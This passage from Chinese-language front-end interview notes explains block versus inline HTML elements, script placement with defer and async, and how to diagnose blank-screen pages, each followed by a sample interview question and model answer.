- `apple-mobile-web-app-capable` 只在用户将网页添加到主屏幕后生效
- 在 Safari 浏览器中直接访问不会全屏
- iOS 16.4+ 开始支持 Web Push 通知，PWA 能力进一步增强

---

## 1.6 HTML 行内元素和块级元素

#### 知识点详解

**块级元素（Block-level Elements）：**

```css
/* 块级元素特点 */
div, p, h1-h6, ul, ol, li, form {
    display: block;
    
    /* 特点： */
    width: 100%;     /* 默认占满父容器宽度 */
    height: auto;    /* 高度由内容决定 */
    margin-top/bottom: 有效;
    padding: 所有方向有效;
}
```

**行内元素（Inline Elements）：**

```css
/* 行内元素特点 */
span, a, strong, em, img, input {
    display: inline;
    
    /* 特点： */
    width: auto;      /* 由内容决定，无法设置宽高 */
    height: auto;
    margin-top/bottom: 无效（水平有效）
    padding: 所有方向有效但不会推开其他元素
}
```

**行内块元素（Inline-block）：**

```css
input, button, img {
    display: inline-block;
    /* 特点： */
    width/height: 可设置
    margin/padding: 全部有效
    和其他行内元素在同一行
}
```

**HTML5 分类变化：**

```
HTML4:
├── 块级元素: div, p, h1, ul, ol, table
├── 行内元素: span, a, strong, em, img, input
└── 特殊: table, input, button

HTML5:
├── 布局元素: header, nav, main, article, section, aside, footer
├── 文本元素: span, strong, em, mark, time
├── 表单元素: input, button, select, textarea
└── 媒体元素: img, video, audio, canvas
```

#### 真实面试题

**题目：行内元素和块级元素有什么区别？CSS 中如何转换？**

**满分答案：**

| 特性 | 块级元素 | 行内元素 |
|------|---------|---------|
| 默认 display | block | inline |
| 宽度 | 默认 100% | 由内容决定 |
| 高度 | 由内容决定 | 由内容决定 |
| 换行 | 独占一行 | 同行显示 |
| margin 上下 | 有效 | 无效 |
| padding 上下 | 有效 | 有效但不推开元素 |
| 可设置宽高 | 可以 | 不可以 |

**转换方式：**
- `display: block` - 转为块级
- `display: inline` - 转为行内
- `display: inline-block` - 转为行内块（兼具两者优点）

---

## 1.7 Script 标签位置：head vs body

#### 知识点详解

**HTML 渲染过程：**

```
1. 解析 HTML → 2. 构建 DOM 树 → 3. 构建渲染树 → 4. 布局 → 5. 绘制
```

**脚本位置的影响：**

| 位置 | 加载时机 | 执行时机 | 对页面影响 |
|------|---------|---------|-----------|
| head（同步） | 阻塞解析 | 立即执行 | 阻塞页面渲染，白屏时间增加 |
| head + defer | 并行下载 | 解析完成后 | 不阻塞，推荐使用 |
| head + async | 并行下载 | 下载完成立即执行 | 可能阻塞解析，不保证顺序 |
| body 底部 | HTML 解析后 | 立即执行 | 不阻塞，推荐使用 |

**图示：**

```
无属性 script（在 head）:
HTML 解析 ████████████ 暂停 ████████████ 执行 JS ████████████
页面显示                                          白屏

defer script（在 head）:
HTML 解析 ████████████████████████████████ 
JS 下载   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
JS 执行                                     ▓▓▓▓▓
页面显示                                     显示

body 底部 script:
HTML 解析 ██████████████████████
JS 执行/下载                                  ▓▓▓▓▓
页面显示                                     显示
```

**最佳实践：**

```html
<head>
    <!-- 关键 CSS 内联 -->
    <style>/* 关键渲染路径 CSS */</style>
    
    <!-- defer 加载非关键 JS -->
    <script src="app.js" defer></script>
</head>
<body>
    <!-- 内容 -->
    <div id="app"></div>
    
    <!-- 底部放其他脚本 -->
    <script src="analytics.js"></script>
</body>
```

#### 真实面试题

**题目：script 标签放在 head 和 body 底部有什么区别？**

**满分答案：**

1. **head 同步脚本**：阻塞 HTML 解析，导致白屏
2. **body 底部**：HTML 解析完成后再执行，不阻塞渲染
3. **defer 属性**：并行下载，解析完成后按顺序执行
4. **async 属性**：并行下载，下载完成立即执行

**推荐：**
- 关键 JS：放在 body 底部或使用 defer
- 第三方统计：使用 async（不阻塞但尽早加载）

---

## 1.8 白屏问题排查

#### 知识点详解

**白屏原因分析：**

1. **JavaScript 错误**
   - 语法错误导致整个脚本解析失败
   - 异步加载的 JS 报错不影响首屏，但同步错误会阻塞

2. **资源加载问题**
   - CSS 阻塞渲染（特别是内联在 head 的样式）
   - 图片/字体加载失败（静默失败）
   - CDN 资源 404

3. **网络问题**
   - DNS 解析失败
   - TCP 连接超时
   - SSL 证书问题（HTTPS 白屏）

4. **兼容性问题**
   - 使用了不支持的 API（如 ES6+ 在旧浏览器）
   - CSS 新特性在某些浏览器不兼容

**排查方法：**

```javascript
// 1. 检查控制台错误
// 打开 Chrome DevTools → Console

// 2. 检查网络请求
// Network 面板 → 查看是否有失败请求

// 3. Performance 面板
// 录制页面加载过程，分析各阶段耗时

// 4. Lighthouse 审计
// 生成完整的性能报告
```

#### 真实面试题

**题目：页面打开是白屏，可能的原因有哪些？如何快速定位？**

**满分答案：**

**常见原因：**
1. JavaScript 语法/运行时错误
2. 资源加载失败（CSS、JS、图片）
3. 网络问题（DNS、连接超时）
4. 浏览器兼容性问题

**排查步骤：**
1. 打开控制台，看是否有红色错误
2. 检查 Network 面板，看资源加载状态
3. 查看 Elements 面板，检查 DOM 结构是否完整
4. 使用 Lighthouse 做完整审计

**预防措施：**
- 做好错误边界（Error Boundary）
- 关键 CSS 内联，非关键异步加载
- 做好资源容错和降级

---

